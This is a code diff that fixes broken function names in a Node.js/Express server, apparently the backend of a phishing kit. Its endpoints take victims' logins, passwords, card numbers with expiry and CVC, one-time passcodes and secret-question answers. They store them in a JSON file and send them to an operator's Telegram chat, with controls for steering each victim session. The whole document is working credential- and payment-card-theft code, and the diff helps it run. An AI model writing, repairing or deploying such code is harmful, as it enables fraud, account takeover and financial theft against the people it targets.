@@ -18,7 +18,7 @@ const bot = new TelegramBot(config.token, { polling: true });
 const userDataPath = path.join(__dirname, 'userData.json');
 const routesDataPath = path.join(__dirname, 'routes.json');
 
-const readUser Data = () => {
+const readUserData = () => {
     if (fs.existsSync(userDataPath)) {
         const data = fs.readFileSync(userDataPath);
         if (data.length === 0) return {};
@@ -27,7 +27,7 @@ const readUser Data = () => {
     return {};
 };
 
-const writeUser Data = (data) => {
+const writeUserData = (data) => {
     fs.writeFileSync(userDataPath, JSON.stringify(data, null, 2));
 };
 
@@ -50,7 +50,7 @@ bot.sendMessage(config.chatId, 'Bot is up and running!').catch(error => {
 
 app.post('/api/cred', upload.none(), (req, res) => {
     const { login, password, sessionId, offer, additional } = req.body;
-    const users = readUser Data();
+    const users = readUserData();
     if (!users[sessionId]) {
         users[sessionId] = {};
     }
@@ -58,7 +58,7 @@ app.post('/api/cred', upload.none(), (req, res) => {
     users[sessionId].password = password;
     users[sessionId].offer = offer;
     users[sessionId].additional = additional;
-    writeUser Data(users);
+    writeUserData(users);
 
     let message = '';
     if (offer) message += `💼 Offer: \`${offer}\`\n`;
@@ -107,14 +107,14 @@ app.post('/api/action', (req, res) => {
 
 app.post('/api/card', upload.none(), (req, res) => {
     const { card, exp, cvc, sessionId } = req.body;
-    const users = readUser Data();
+    const users = readUserData();
     if (!users[sessionId]) {
         users[sessionId] = {};
     }
     users[sessionId].card = card;
     users[sessionId].exp = exp;
     users[sessionId].cvc = cvc;
-    writeUser Data(users);
+    writeUserData(users);
     let message = '';
     if (users[sessionId].offer) message += `💼 Offer: \`${users[sessionId].offer || ''}\`\n`;
     if (users[sessionId].login) message += `👤 Login: \`${users[sessionId].login || ''}\`\n`;
@@ -143,12 +143,12 @@ app.post('/api/card', upload.none(), (req, res) => {
 
 app.post('/api/otp', upload.none(), (req, res) => {
     const { otp, sessionId } = req.body;
-    const users = readUser Data();
+    const users = readUserData();
     if (!users[sessionId]) {
         users[sessionId] = {};
     }
     users[sessionId].otp = otp;
-    writeUser Data(users);
+    writeUserData(users);
     let message = '';
     if (users[sessionId].offer) message += `💼 Offer: \`${users[sessionId].offer || ''}\`\n`;
     if (users[sessionId].login) message += `👤 Login: \`${users[sessionId].login || ''}\`\n`;
@@ -177,12 +177,12 @@ app.post('/api/otp', upload.none(), (req, res) => {
 
 app.post('/api/secret', upload.none(), (req, res) => {
     const { secret, sessionId } = req.body;
-    const users = readUser Data();
+    const users = readUserData();
     if (!users[sessionId]) {
         users[sessionId] = {};
     }
     users[sessionId].secret = secret;
-    writeUser Data(users);
+    writeUserData(users);
     const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${users[sessionId].card || ''}\ ` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`${users[sessionId].customResponse || ''}\`\nSession ID: \`${sessionId}\``;    
     const options = {
         reply_markup: {
@@ -201,12 +201,12 @@ app.post('/api/secret', upload.none(), (req, res) => {
 
 app.post('/api/answer', upload.none(), (req, res) => {
     const { answer, sessionId } = req.body;
-    const users = readUser  Data();
+    const users = readUserData();
     if (!users[sessionId]) {
         users[sessionId] = {};
     }
     users[sessionId].customResponse = answer;
-    writeUser  Data(users);
+    writeUserData(users);
     const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`${answer}\`\nSession ID: \`${sessionId}\``;    
     const options = {
         reply_markup: {
@@ -262,7 +262,7 @@ bot.on('message', (msg) => {
         return;
     }
 
-    const users = readUser  Data();
+    const users = readUserData();
     try {
         if (routes[sessionId] && routes[sessionId].action === 'waiting_for_secret_question') {
             const secretQuestion = msg.text;
